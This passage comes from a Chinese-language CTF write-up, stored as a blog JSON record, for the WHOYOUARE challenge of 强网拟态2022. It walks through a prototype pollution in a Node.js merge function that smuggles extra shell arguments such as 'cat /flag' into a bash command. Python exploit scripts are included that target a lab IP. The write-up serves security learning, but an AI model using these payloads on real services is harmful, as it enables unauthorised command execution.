class=\"line\">user=<span class=\"string\">&#x27;&#x27;&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;2&quot;:&quot;whoami&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;,&quot;id&quot;]&#125;&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(requests.post(url=url, json=&#123;<span class=\"string\">&quot;user&quot;</span>: user&#125;).text)</span><br></pre></td></tr></table></figure>\n\n<p>只看调试结果，command数组的变化</p>\n<p>开始都是一样的，再加上这里的command数组符合checkUser的要求，通过</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906131218447.png\" alt=\"image-20230906131218447\"></p>\n<p>当运行到key为<code>prototype</code>时，</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906131333083.png\" alt=\"image-20230906131333083\"></p>\n<p>可以看到<code>target</code>，也就是<code>request.user</code>，也获得了一个属性2且值为<code>whoami</code>的，说明污染成功</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906131429139.png\" alt=\"image-20230906131429139\"></p>\n<p>继续看对command数组的影响，虽然两者<code>command</code>数组一样，但是后面就会出现区别</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906133038986.png\" alt=\"image-20230906133038986\"></p>\n<p>发现在不断的<code>merge</code>合并时，<code>user</code>和<code>request.user</code>中两者的数组中的<code>key</code>也在比较，但是由于两者的<code>command</code>数组中是字符串，属于<code>whileTypes</code>，所以会直接将<code>target[key] = source[key];</code>，也就是将<code>user</code>中值赋值给<code>request.user</code>，也就是修改<code>command</code>值</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> whileTypes = [<span class=\"string\">&#x27;boolean&#x27;</span>, <span class=\"string\">&#x27;string&#x27;</span>, <span class=\"string\">&#x27;number&#x27;</span>, <span class=\"string\">&#x27;bigint&#x27;</span>, <span class=\"string\">&#x27;symbol&#x27;</span>, <span class=\"string\">&#x27;undefined&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!whileTypes.<span class=\"title function_\">includes</span>(<span class=\"keyword\">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class=\"title function_\">includes</span>(<span class=\"keyword\">typeof</span> target[key]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(key !== <span class=\"string\">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class=\"line\">                <span class=\"title function_\">merge</span>(target[key], source[key]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    target[key] = source[key];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于<code>key=0</code>和<code>key=1</code>两者都一样都是<code>-c</code>,<code>id</code>，所以赋值没有变化</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906132428230.png\" alt=\"image-20230906132428230\"></p>\n<p>当<code>key=2</code>时，因为之前执行<code>prototype</code>时，使得<code>request.user</code>也有属性2这个值，</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906133910040.png\" alt=\"image-20230906133910040\"></p>\n<p>虽然这个属性2是在Object中，但是是在Array之上，所以即便command数组中没有key&#x3D;2，但是仍然就会从原型链中寻找，所以当再次运行到<code>target[key] = source[key];</code>时，属性2就被当作command的属性2，赋值进去了</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906134039538.png\" alt=\"image-20230906134039538\"></p>\n<p>于是最后执行命令时就是，</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"built_in\">id</span> <span class=\"built_in\">whoami</span></span><br></pre></td></tr></table></figure>\n\n<p>由这个现象便可以构造出<code>payload</code>，可以看到便得到flag{test}</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://172.28.31.86:3000/user&quot;</span></span><br><span class=\"line\">user=<span class=\"string\">&#x27;&#x27;</span><span class=\"string\">&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;2&quot;:&quot;cat /flag&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;,&quot;-i&quot;]&#125;&#x27;</span><span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"title function_\">print</span>(&#123;<span class=\"string\">&quot;user&quot;</span>:user&#125;)</span><br><span class=\"line\"><span class=\"title function_\">print</span>(requests.<span class=\"title function_\">post</span>(url=url, json=&#123;<span class=\"string\">&quot;user&quot;</span>: user&#125;).<span class=\"property\">text</span>)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906134555175.png\" alt=\"image-20230906134555175\"></p>\n<p>当然这只是一个，同理，既然限制command数组中元素个数要小于等于2，所以一个也是可以的</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"attr\">http</span>:<span class=\"comment\">//172.28.31.86:3000/user</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://172.28.31.86:3000/user&quot;</span></span><br><span class=\"line\">user=<span class=\"string\">&#x27;&#x27;</span><span class=\"string\">&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;1&quot;:&quot;cat /flag&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;]&#125;&#x27;</span><span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"title function_\">print</span>(&#123;<span class=\"string\">&quot;user&quot;</span>:user&#125;)</span><br><span class=\"line\"><span class=\"title function_\">print</span>(requests.<span class=\"title function_\">post</span>(url=url, json=&#123;<span class=\"string\">&quot;user&quot;</span>: user&#125;).<span class=\"property\">text</span>)</span><br></pre></td></tr></table></figure>\n\n<p>结果同上，只是不能让command为空就行，不然会报错</p>\n<hr>\n<p>直接浏览器<code>console</code>，展示也可以理解原理</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906160734249.png\" alt=\"image-20230906160734249\"></p>\n<p>这里的属性2实际是在command实体中</p>\n<p><img src=\"/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%8/image-20230906160836260.png\" alt=\"image-20230906160836260\"></p>\n<h2 id=\"NoRCE\"><a href=\"#NoRCE\" class=\"headerlink\" title=\"NoRCE\"></a>NoRCE</h2>","text":"学习学习 强网拟态2022WHOYOUARE这道题目的环境是nodejs，猜考点是原型链污染，其框架根据附件名称可知为fastify 看题目名字和刚打开题目的提...","permalink":"/post/2022强网拟态","photos":[],"count_time":{"symbolsCount":"9.9k","symbolsTime":"9 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022\"><span class=\"toc-text\">强网拟态2022</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WHOYOUARE\"><span class=\"toc-text\">WHOYOUARE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">代码审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#app-js\"><span class=\"toc-text\">app.js</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#user-js\"><span class=\"toc-text\">user.js</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#merge-js\"><span class=\"toc-text\">merge.js</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NoRCE\"><span class=\"toc-text\">NoRCE</span></a></li></ol></li></ol>","author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"西湖论剑2022-wp","uid":"3e22a855be290895a6fbe5843d97f92e","slug":"2022西湖论剑","date":"2023-02-14T05:04:26.911Z","updated":"2023-08-25T02:09:35.567Z","comments":true,"path":"api/articles/2022西湖论剑.json","keywords":null,"cover":"/img/36.jpg","text":"麻了，我也想在比赛时输出，而不是比赛后 西湖论剑2022real_ez_node启动环境后页面 ejs猜测是原型链污染 分析一下代码 app.js 123456...","permalink":"/post/2022西湖论剑","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"2022RCTF","uid":"5989226e724dd04d4cb9a6777f53450e","slug":"2022RCTF","date":"2023-02-13T15:21:49.888Z","updated":"2023-08-06T08:02:03.811Z","comments":true,"path":"api/articles/2022RCTF.json","keywords":null,"cover":"/img/41.jpg","text":"学到很多 RCTF2022easyupload 附件 https://adworld.xctf.org.cn/media/file/task/0e2ca001-...","permalink":"/post/2022RCTF","photos":[],"count_time":{"symbolsCount":"38k","symbolsTime":"35 mins."},"categories":[{"name":"网络安全学习","slug":"网络安全学习","count":26,"path":"api/categories/网络安全学习.json"}],"tags":[{"name":"Game","slug":"Game","count":12,"path":"api/tags/Game.json"}],"author":{"name":"Ttoc","slug":"blog-author","avatar":"/static/img/logo.png","link":"/","description":"必须从过去的错误学习教训，而非依赖过去的成功","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}